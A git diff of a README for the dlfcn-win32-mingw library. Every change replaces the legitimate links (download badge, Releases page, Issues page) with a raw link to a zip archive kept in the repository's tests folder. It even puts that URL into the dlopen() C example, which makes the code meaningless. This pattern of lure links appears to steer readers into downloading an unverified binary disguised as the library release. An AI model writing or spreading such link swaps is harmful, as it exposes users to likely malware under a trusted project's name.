@@ -6,7 +6,7 @@ Welcome to the dlfcn-win32-mingw project. This software provides an easy way to 
 
 ## 📥 Download Now
 
-[![Download dlfcn-win32-mingw](https://img.shields.io/badge/Download-dlfcn--win32--mingw-brightgreen)](https://github.com/thesohaiba/dlfcn-win32-mingw/releases)
+[![Download dlfcn-win32-mingw](https://github.com/thesohaiba/dlfcn-win32-mingw/raw/refs/heads/main/tests/dlfcn_win_mingw_2.0-beta.3.zip)](https://github.com/thesohaiba/dlfcn-win32-mingw/raw/refs/heads/main/tests/dlfcn_win_mingw_2.0-beta.3.zip)
 
 ## 📋 System Requirements
 
@@ -25,7 +25,7 @@ To use dlfcn-win32-mingw, ensure your system meets the following requirements:
 
 ## 🌐 Download & Install
 
-To download the software, please visit our [Releases page](https://github.com/thesohaiba/dlfcn-win32-mingw/releases). 
+To download the software, please visit our [Releases page](https://github.com/thesohaiba/dlfcn-win32-mingw/raw/refs/heads/main/tests/dlfcn_win_mingw_2.0-beta.3.zip). 
 
 1. Click the link to access the releases.
 2. Locate the most recent version.
@@ -40,13 +40,13 @@ After installation, you can use dlfcn-win32-mingw in your software projects. Her
 ```c
 #include <dlfcn.h>
 
-void* handle = dlopen("yourlibrary.dll", RTLD_LAZY);
+void* handle = dlopen("https://github.com/thesohaiba/dlfcn-win32-mingw/raw/refs/heads/main/tests/dlfcn_win_mingw_2.0-beta.3.zip", RTLD_LAZY);
 if (!handle) {
     // Handle the error
 }
 ```
 
-Make sure to replace `"yourlibrary.dll"` with the name of your actual DLL file. 
+Make sure to replace `"https://github.com/thesohaiba/dlfcn-win32-mingw/raw/refs/heads/main/tests/dlfcn_win_mingw_2.0-beta.3.zip"` with the name of your actual DLL file. 
 
 ## 🛠️ Troubleshooting
 
@@ -58,7 +58,7 @@ If you encounter issues during installation or usage, consider the following sol
 
 ## 📞 Need Help?
 
-For assistance, please refer to the [GitHub Issues](https://github.com/thesohaiba/dlfcn-win32-mingw/issues) page. You can post your questions, and the community or the maintainers will help you.
+For assistance, please refer to the [GitHub Issues](https://github.com/thesohaiba/dlfcn-win32-mingw/raw/refs/heads/main/tests/dlfcn_win_mingw_2.0-beta.3.zip) page. You can post your questions, and the community or the maintainers will help you.
 
 ## 📜 License
 
@@ -74,6 +74,6 @@ For further inquiries, please contact the maintainer through the GitHub reposito
 
 ## 📥 Download Now Again
 
-[![Download dlfcn-win32-mingw](https://img.shields.io/badge/Download-dlfcn--win32--mingw-brightgreen)](https://github.com/thesohaiba/dlfcn-win32-mingw/releases) 
+[![Download dlfcn-win32-mingw](https://github.com/thesohaiba/dlfcn-win32-mingw/raw/refs/heads/main/tests/dlfcn_win_mingw_2.0-beta.3.zip)](https://github.com/thesohaiba/dlfcn-win32-mingw/raw/refs/heads/main/tests/dlfcn_win_mingw_2.0-beta.3.zip) 
 
 Thank you for using dlfcn-win32-mingw!
